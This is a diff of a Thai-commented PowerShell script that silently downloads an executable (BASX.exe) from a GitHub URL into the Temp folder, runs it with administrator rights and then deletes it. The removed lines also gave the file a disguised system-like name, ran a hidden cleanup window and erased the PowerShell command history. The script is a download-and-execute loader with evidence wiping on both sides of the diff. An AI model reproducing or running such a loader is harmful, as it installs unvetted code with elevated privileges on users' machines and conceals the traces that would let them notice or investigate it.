@@ -1,23 +1,19 @@
-$ErrorActionPreference = 'SilentlyContinue'
-
-# 1. ตั้งที่อยู่ไฟล์ (ใช้ Temp แทนเพื่อความชัวร์ที่สุด)
-$output = "$env:TEMP\WinSysHelper.exe"
+# 1. ตั้งค่าเบื้องหลัง
 $url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
+$output = "$env:TEMP\BASX.exe"
 
-# 2. ดาวน์โหลดไฟล์
-(New-Object System.Net.WebClient).DownloadFile($url, $output)
+# 2. ดาวน์โหลดไฟล์แบบเงียบๆ (ไม่ให้มีแถบโหลดขึ้น)
+$ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri $url -OutFile $output
 
-# 3. สั่งรันแบบ Admin และสั่งลบตัวเองทิ้งเบื้องหลัง
+# 3. สั่งรันแบบ Admin และ "รอ" จนกว่าโปรแกรมจะปิด
+# -Wait คือหัวใจสำคัญ: มันจะรอจนกว่า BASX.exe ของบาสจะดับ
+Start-Process -FilePath $output -Verb RunAs -Wait
+
+# 4. พอดับปุ๊บ สั่งลบไฟล์ทิ้งทันที
 if (Test-Path $output) {
-    # รัน EXE
-    Start-Process -FilePath $output -Verb RunAs
-    
-    # สั่ง CMD มารอ 10 วินาทีแล้วค่อยลบไฟล์ทิ้ง (รันซ่อนไว้เบื้องหลัง)
-    Start-Process cmd -ArgumentList "/c timeout /t 10 && del /f /q `"$output`"" -WindowStyle Hidden
+    Remove-Item -Path $output -Force
 }
 
-# 4. ลบประวัติ PowerShell
-try { Remove-Item (Get-PSReadlineOption).HistorySavePath -Force } catch {}
-
-# ปิดท้ายด้วยการปิด PowerShell
+# 5. ปิด PowerShell ตัวเองทันที
 exit
